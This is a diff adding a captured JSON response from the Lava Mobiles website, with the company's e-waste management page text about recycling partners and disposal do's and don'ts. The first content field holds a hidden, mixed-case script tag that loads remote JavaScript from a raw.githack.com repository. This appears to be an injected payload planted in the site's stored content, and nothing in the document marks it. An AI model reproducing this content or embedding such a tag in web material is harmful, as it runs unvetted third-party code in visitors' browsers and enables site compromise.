@@ -1,0 +1,38 @@
+{
+  "url": "https://www.lavamobiles.com/_next/data/ly0JhjssYFJ7DcRKPylzU/e-waste-management.json",
+  "method": "GET",
+  "status": 200,
+  "content_type": "application/json",
+  "body": {
+    "pageProps": {
+      "ewasteData": {
+        "status": 1,
+        "msg": "e-waste-management Page Content",
+        "data": {
+          "id": 10,
+          "slug": "e-waste-management",
+          "name": "E-waste Management",
+          "sub_text": null,
+          "content1": "<li>E-waste is a popular, informal name for electronic products nearing the end of their \"useful life.\" Mobile Phones and their accessories, Telephones, pay phones, cordless phones, Air Conditioners, Televisions, Refrigerators, Washing Machines, Computers, VCDs, stereos, copiers, and fax machines are common electronic products. Many of these products can be reused, refurbished, or recycled.</li>\r\n                <li>\r\n                E-waste has been one of the fastest growing waste streams in the world. While e-waste contains valuable materials such as aluminium, copper, gold, palladium and silver, it also contains harmful substances like cadmium, lead and mercury. In the absence of proper awareness, disposing e-waste in landfill can result in toxic emissions to the air, water and soil and pose a serious health and environmental hazards.\r\n                </li><sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
+          "content2": "<li>At LAVA we understand that our responsibility doesn't end at selling you our products. LAVA has been working in the area of safe disposal of electronic waste. Since mobiles and other electronic items are made of hazardous constituents under our e-waste policy as well the legislation passed by the Ministry of Environment Forests and Climate Change (MoEF &amp; CC) Government of India, called E-waste (Management) Rules, 2016, which comes into effect from 1st Oct 2016.</li>\r\n                <li>\r\n                LAVA will seek shared responsibility and cooperation from customers in reducing the environmental impact of their products.\r\n                </li>\r\n                <li>LAVA will comply with all the applicable laws related to e-waste management. As a part of e-waste recycling initiative, LAVA has partnered with 3R Recycler, Greeniva Recycler, Attero Recycling India's leading electronic asset management and disposal company to comply with E-Waste (Management) Rules, 2016 in providing environmentally sound management of end of life electronics.</li>\r\n                <li>3R Recycler, Greeniva Recycler, Attero Recycling - As part of this partnership with  Attero Recycling and Scope Recycling, Attero Recycling the company will ensure environmentally sound management of electronics that have reached their end of life phase.  Attero Recycling and Scope Recycling, Attero Recycling has obtained all the necessary authorizations from the appropriate governmental agencies for their processing facilities. 3R Recycler, Greeniva Recycler, Attero Recycling ensures proper recycling and disposal of e-waste. This helps us protect the environment from any hazardous consequences, which would be otherwise caused by the inappropriate waste management of e-waste.</li>",
+          "content3": "<li>Follow the instructions for proper handling of end-of-life equipment in our catalogues</li>  \r\n              <li>Make sure that your electronic products are recycled only by authorised recyclers/dismantlers</li>\r\n              <li>Consult your nearest LAVA Collection Point for disposing products that have reached end-of-life</li>\r\n              <li>Drop-off used Mobile Phones, batteries or any accessories at the nearest LAVA Collection Point</li>\r\n              <li>Separate the packaging materials from the electronic products as per safe waste disposal options</li>\r\n              <li>Protect the glass surface of any electronic product to avoid breakage</li>",
+          "content4": "<li>Never dismantle your electronic products yourself</li>  \r\n              <li>Never dispose electronic products in bins having 'Do Not Dispose' sign</li>\r\n              <li>Never sell or give e-waste to informal and unorganised sectors like local scrap dealer/ rag pickers</li>\r\n              <li>Never throw your electronic waste along with municipal waste as they end up reaching landfills.</li>",
+          "content5": null,
+          "content6": null,
+          "page_title": "Lava Mobiles",
+          "meta_keywords": "Lava Mobile Phones, Latest Mobile Phones in India, Iris Smartphones, android phone, best android phone, android smart phone, touch phones, Lava Mobiles, Lava Tablets, Routers, Datacards, Lava",
+          "meta_description": "Discover a range of Quality Products from Lava International. View the best in class Android smartphones, tablets, feature phones, routers and data cards.",
+          "meta_other": null,
+          "video_url": null,
+          "image": "media/cmspage/image/ewaste-banner-1702534517.webp",
+          "image_alt": null,
+          "image_mobile": "media/cmspage/image_mobile/frame-157508-1703585044.webp",
+          "status": 1
+        },
+        "leadership": {},
+        "success": "success"
+      }
+    },
+    "__N_SSG": true
+  }
+}
